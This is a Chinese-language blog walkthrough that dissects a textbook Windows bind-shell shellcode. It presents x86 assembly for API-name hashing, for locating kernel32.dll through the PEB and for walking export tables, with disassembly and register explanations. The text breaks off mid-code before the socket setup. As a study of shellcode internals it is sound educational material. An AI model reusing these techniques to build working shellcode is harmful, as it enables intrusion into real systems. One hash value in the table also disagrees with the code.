@@ -1,0 +1,1877 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>bindshell逆向分析 | Deutschball&#39;s blog</title>
+
+  <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/DeutschBall/test/master/emp.png">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://cdn.jsdelivr.net/gh/inkss/fontawesome@5.15.3/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+    <script>
+        var themeModelId = '';
+        if (themeModelId) {
+            localStorage.setItem('modelId', themeModelId);
+        }
+    </script>
+    
+    <script src="https://cdn.jsdelivr.net/gh/yuang01/live2d-widget@latest/autoload.js"></script>
+    <script>
+        var live2dOpen = eval('true') || false;
+        if (!live2dOpen) {
+            localStorage.setItem('waifu-display', 1609323474481);
+        }
+    </script>
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+        <script src="/js/valine/av-min@3.0.4.js"></script>
+        <script src="https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js"></script>
+    
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head>
+
+  
+  <!-- 依赖于jquery和vue -->
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+
+  
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/vue@2.6.11/dist/vue.min.js"></script>
+
+  
+  
+  <body>
+    <!-- 预加载动画 -->
+    <!-- 页面预加载动画 -->
+
+<div id='loader'>
+  <link rel="stylesheet" href="/js/loaded/index.css" >
+  <div class="loading-left-bg"></div>
+  <div class="loading-right-bg"></div>
+  <div class="spinner-box">
+    <div class="configure-border-1">
+      <div class="configure-core"></div>
+    </div>
+    <div class="configure-border-2">
+      <div class="configure-core"></div>
+    </div>
+    <div class="loading-word">loading...</div>
+  </div>
+</div>
+
+<script>
+  var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('DOMContentLoaded',endLoading);
+  
+</script>
+
+    
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('true');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (href, before, media, attributes) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header   " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo lazyload placeholder" src="https://raw.githubusercontent.com/DeutschBall/test/master/emp.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/test/master/emp.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="logo">
+      <h3 class="drawer-box-head_title">Deutschball&#39;s blog</h3>
+      <h5 class="drawer-box-head_desc"></h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/DeutschBall">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="https://raw.githubusercontent.com/DeutschBall/test/master/emp.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/test/master/emp.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">Deutschball&#39;s blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">Search</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="Please enter keywords"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/DeutschBall" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+ <!-- prismjs 代码高亮 -->
+ 
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('/medias/6.jpg')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        bindshell逆向分析
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> Published in：2022-09-18 |
+        </span>
+      
+
+      
+
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="row justify-position" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="Bind-shell"><a href="#Bind-shell" class="headerlink" title="Bind_shell"></a>Bind_shell</h1><h2 id="哈希算法设计"><a href="#哈希算法设计" class="headerlink" title="哈希算法设计"></a>哈希算法设计</h2><p>1.哈希算法不能发生碰撞,或者说存在发生碰撞的可能,但是可以肯定的是,首先匹配的就是目标函数.原则上不设计处理碰撞的算法</p>
+<p>2.函数名的摘要值尽可能短</p>
+<p>3.哈希算法自己的篇幅尽量短</p>
+<p>4.哈希后的摘要值可以当作”准nop指令”,即在数值上相当于某些机器码,但是这些机器码的执行不会对shellcode产生影响.如此可以省去跳转指令</p>
+<p>书上采取的哈希算法是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hash_loop: </span><br><span class="line">	lodsb 					; load next char into al and increment esi </span><br><span class="line">	xor al, 0x71 				; XOR current char with 0x71 </span><br><span class="line">	sub dl, al 				; update hash with current char </span><br><span class="line">	cmp al, 0x71 				; loop until we reach end of string </span><br><span class="line">	jne hash_loop </span><br></pre></td></tr></table></figure>
+<p>dl初始值为0,</p>
+<p>将库函数名逐个字节与0x71异或然后用dl减去该值累计哈希值,</p>
+<p>最终的哈希值放在dl中,只需要1个字节</p>
+<p>用这个哈希算法得到的各个函数的哈希值:</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>哈希值</th>
+<th>准nop指令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>LoadLibraryA</td>
+<td>0x59</td>
+<td>pop ecx</td>
+</tr>
+<tr>
+<td>CreateProcessA</td>
+<td>0x91</td>
+<td></td>
+</tr>
+<tr>
+<td>ExitProcess</td>
+<td>0xc9</td>
+<td></td>
+</tr>
+<tr>
+<td>WSAStartup</td>
+<td>0xd3</td>
+<td>or ecx,0x203062d3</td>
+</tr>
+<tr>
+<td>WSASocketA</td>
+<td>0x62</td>
+<td></td>
+</tr>
+<tr>
+<td>bind</td>
+<td>0x30</td>
+<td></td>
+</tr>
+<tr>
+<td>listen</td>
+<td>0x20</td>
+<td></td>
+</tr>
+<tr>
+<td>accept</td>
+<td>0x41</td>
+<td>ecx</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>然后紧跟着cmd也写上</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>Ascii字符</th>
+<th>Ascii值</th>
+<th>准nop指令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>C</td>
+<td>0x43</td>
+<td>inc ebx</td>
+</tr>
+<tr>
+<td>M</td>
+<td>0x4d</td>
+<td>dec dbp</td>
+</tr>
+<tr>
+<td>d</td>
+<td>0x64</td>
+<td>FS:</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>准nop指令全都是不疼不痒的指令</p>
+<p>因此bind-shell一开始是这样写的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; start of shellcode </span><br><span class="line">; assume: eax points here </span><br><span class="line">; function hashes (executable as nop-equivalent) </span><br><span class="line">	_emit 0x59	; LoadLibraryA ; pop ecx </span><br><span class="line">	_emit 0x81 	; CreateProcessA ; or ecx, 0x203062d3 </span><br><span class="line">	_emit 0xc9 	; ExitProcess </span><br><span class="line">	_emit 0xd3 	; WSAStartup </span><br><span class="line">	_emit 0x62 	; WSASocketA </span><br><span class="line">	_emit 0x30 	; bind </span><br><span class="line">	_emit 0x20 	; listen </span><br><span class="line">	_emit 0x41 	; accept ; inc ecx </span><br><span class="line"></span><br><span class="line">; &quot;CMd&quot; </span><br><span class="line">	_emit 0x43 	; inc ebx </span><br><span class="line">	_emit 0x4d 	; dec ebp </span><br><span class="line">	_emit 0x64 	; FS: </span><br></pre></td></tr></table></figure>
+<p>_emit相当于db,作用是定义字节数据</p>
+<p>这些数据会被当做指令执行下来,但是影响不大</p>
+<p>用ida反汇编观察这片区域</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">59                            pop     ecx</span><br><span class="line">81 C9 D3 62 30 20             or      ecx, 203062D3h</span><br><span class="line">41                            inc     ecx</span><br><span class="line">43                            inc     ebx</span><br><span class="line">4D                            dec     ebp</span><br><span class="line">                              db      64h</span><br></pre></td></tr></table></figure>
+<p>只要是不影响程序计数器eip的指令,比如跳转和调用,都可以作为准nop指令</p>
+<p>后面的指令从windows11上调试会发生错误,需要在windowsXP上调</p>
+<h2 id="解析符号"><a href="#解析符号" class="headerlink" title="解析符号"></a>解析符号</h2><p>用三层循环解析符号,最外圈遍历我们要找的符号,中圈遍历库函数,内圈计算一个库函数的哈希值然后和我们的哈希值进行比较</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918111811581.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918111811581.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918111811581"></p>
+<p>用伪代码表示为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(遍历我们给出的符号哈希表)&#123;</span><br><span class="line">	<span class="keyword">while</span>(遍历库函数名表)&#123;</span><br><span class="line">		<span class="keyword">while</span>(计算一个库函数的哈希值);</span><br><span class="line">		<span class="keyword">if</span>(库函数哈希值=我们给出的哈希值)&#123;</span><br><span class="line">			<span class="comment">//找到了该符号;</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="comment">//没有找到该符号,尝试下一个用库函数来解析本符号;</span></span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(我们的哈希表解析到头)&#123;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="外圈循环初始化"><a href="#外圈循环初始化" class="headerlink" title="外圈循环初始化"></a>外圈循环初始化</h3><p>使用装载器执行bindshell时,bindshell之前的指令是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea eax,bindshell</span><br><span class="line">push eax</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>eax的初始值为bindshell的基地址,bindshell在栈中,因此eax的初始值是一个栈中地址,这对于理解后面的cdq指令是有作用的</p>
+<h4 id="设置函数地址存放空间"><a href="#设置函数地址存放空间" class="headerlink" title="设置函数地址存放空间"></a>设置函数地址存放空间</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; start of proper code </span><br><span class="line">	cdq 					; set edx = 0 (eax points to stack so is less than 0x80000000) </span><br><span class="line">	xchg eax, esi 			; esi = addr of first function hash </span><br><span class="line">	lea edi, [esi - 0x18] 	; edi = addr to start writing function </span><br><span class="line">							; addresses (last addr will be written just </span><br><span class="line">							; before &quot;cmd&quot;) </span><br></pre></td></tr></table></figure>
+<p>cdq指令的作用是eax带符号拓展到edx:eax,又bindshell一开始时,eax寄存器中是一个用户栈地址,显然这个值是一个小于0x80000000的数,那么eax的最高位必然是0,带符号拓展到edx全是0,这就用最短的指令使得edx置零了</p>
+<p>xchg将eax和esi寄存器中的值进行交换,交换前esi=0,eax=address(shellcode)</p>
+<p>交换后eax=0,esi=address(shellcode),又shellcode最开始就是<code>_emit 0x59    ; LoadLibraryA ; pop ecx</code>即LoadLibraryA函数的摘要值,因此相当于设置好了源操作数</p>
+<p>然后esi-0x18这个地址放到edi上,距离esi共24字节,放到执行方向的反方向,意思是不要干扰shellcode的执行</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174706970.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174706970.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt=""></p>
+<p><strong>奇怪的是,我们需要解析8个符号,为什么只给了24字节6个符号的地址空间呢?</strong></p>
+<p><strong>这是因为后两个符号将会覆盖一开始给他设定的摘要的位置</strong></p>
+<h4 id="获取kernel32-dll基地址"><a href="#获取kernel32-dll基地址" class="headerlink" title="获取kernel32.dll基地址"></a>获取kernel32.dll基地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line">; find base addr of kernel32.dll </span><br><span class="line">	mov ebx, fs:[edx + 0x30] 	; ebx = address of PEB </span><br><span class="line">	mov ecx, [ebx + 0x0c] 		; ecx = pointer to loader data </span><br><span class="line">	mov ecx, [ecx + 0x1c] 		; ecx = first entry in initialisation order list </span><br><span class="line">	mov ecx, [ecx] 				; ecx = second entry in list (kernel32.dll) </span><br><span class="line">	mov ebp, [ecx + 0x08] 		; ebp = base address of kernel32.dll </span><br></pre></td></tr></table></figure>
+<p>然后开始定位kernel32.dll的基地址</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="md,绝了" style="zoom: 33%;" /></p>
+<p>fs段选择子指向GDT中当前程序的线程环境块描述符,</p>
+<p>用fs段超越寻址,fs:[edx+0x30],此时edx=0,实际上相当于fs:[0x30],也就是TEB表的0x30位置,即PEB的指针.</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>寄存器</th>
+<th>值意义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ebx</td>
+<td>PEB基地址</td>
+</tr>
+<tr>
+<td>ecx</td>
+<td>initialisation order表第二项,kernel32.dll相关项</td>
+</tr>
+<tr>
+<td>ebp</td>
+<td>kernel32.dll的基地址</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h4 id="抬栈申请空间"><a href="#抬栈申请空间" class="headerlink" title="抬栈申请空间"></a>抬栈申请空间</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; make some stack space </span><br><span class="line">	mov dh, 0x03 			; sizeof(WSADATA) is 0x190 </span><br><span class="line">	sub esp, edx </span><br></pre></td></tr></table></figure>
+<p>edx始终是0,dh=0x03则edx=0x300</p>
+<p>然后抬栈0x300字节</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174706970.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174706970.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918174706970"></p>
+<p>先前esp=0x12FF38,之后esp=0x12FC38</p>
+<h4 id="“ws2-32”字符串压栈"><a href="#“ws2-32”字符串压栈" class="headerlink" title="“ws2_32”字符串压栈"></a>“ws2_32”字符串压栈</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; push a pointer to &quot;ws2_32&quot; onto stack </span><br><span class="line">	mov dx, 0x3233 			; rest of edx is null </span><br><span class="line">	push edx </span><br><span class="line">	push 0x5f327377 </span><br><span class="line">	push esp </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里有三个压栈,前两个是压入”ws2_32”,后面这个是保存当时的esp位置</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918170246010.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918170246010.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918170246010"></p>
+<h3 id="外圈循环一次开始"><a href="#外圈循环一次开始" class="headerlink" title="外圈循环一次开始"></a>外圈循环一次开始</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find_lib_functions: </span><br><span class="line">	lodsb 					; load next hash into al and increment esi </span><br><span class="line">	cmp al, 0xd3 				; hash of WSAStartup - trigger </span><br><span class="line">							; LoadLibrary(&quot;ws2_32&quot;) </span><br><span class="line">	jne find_functions </span><br><span class="line">	xchg eax, ebp 			; save current hash </span><br><span class="line">	call [edi - 0xc] 			; LoadLibraryA </span><br><span class="line">	xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">							; with base address of ws2_32.dll </span><br><span class="line">	push edi 					; save location of addr of first winsock function </span><br></pre></td></tr></table></figure>
+<p>汇编语言中不会平白无故地设置标号的,都是为了方便跳转,这里”find_lib_functions”标号意味着循环开始了</p>
+<p>lodsb相当于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,[esi]</span><br><span class="line">inc esi</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174632185.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174632185.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918174632185"></p>
+<p>然后al和0xd3比较的意思是,是否是要解析WSAStartup这个函数,如果是,则说明要到ws2_32库中解析函数了,而刚才一直都是在kernel32.dll中解析函数,因此此时需要更换库基址,又已经从kernel32.dll解析了LoadLibraryA,因此可以直接调用该windowsAPI寻找ws2_32.dll的基地址</p>
+<p>如果al=0xd3就顺序执行,不跳转,调用LoadLibraryA更换库函数地址,然后再执行find_functions,否则直接跳转find_functions</p>
+<h3 id="中圈循环初始化"><a href="#中圈循环初始化" class="headerlink" title="中圈循环初始化"></a>中圈循环初始化</h3><p>实际上外圈循环一次,中圈就初始化一次,两个可以看成一块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find_functions: </span><br><span class="line">	pushad 						; preserve registers </span><br><span class="line">	mov eax, [ebp + 0x3c]		; eax = start of PE header </span><br><span class="line">	mov ecx, [ebp + eax + 0x78]	; ecx = relative offset of export table </span><br><span class="line">	add ecx, ebp 				; ecx = absolute addr of export table </span><br><span class="line">	mov ebx, [ecx + 0x20] 		; ebx = relative offset of names table </span><br><span class="line">	add ebx, ebp 				; ebx = absolute addr of names table </span><br><span class="line">	xor edi, edi 				; edi will count through the functions 